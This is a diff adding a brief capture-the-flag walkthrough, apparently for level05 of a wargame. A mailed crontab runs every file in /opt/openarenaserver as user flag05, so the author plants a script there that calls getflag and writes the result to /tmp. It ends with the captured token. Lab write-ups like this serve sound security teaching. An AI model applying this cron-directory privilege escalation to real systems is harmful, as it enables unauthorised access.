@@ -1,0 +1,11 @@
+On login, we are prompted with a 'You have new mail', we searched /var/mail for files.
+There were a level05 file with a crontab inside:
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+The crontab launch /usr/sbin/openarenaserver scripts every 2 minutes with flags05 permissions
+
+/usr/sbin/openarenaserver is a bash script which execute and delete every binary under /opt/openarenaserver/
+We just need to add our script to the directory: 
+echo -e '#!/usr/bin/env/\n/bin/getflag > /tmp/getflag' > /opt/openarenaserver/getflag && chmod +x /opt/openarenaserver/getflag
+Wait for the crontab to run and: 
+cat /tmp/getflag
+	Check flag.Here is your token : viuaaale9huek52boumoomioc
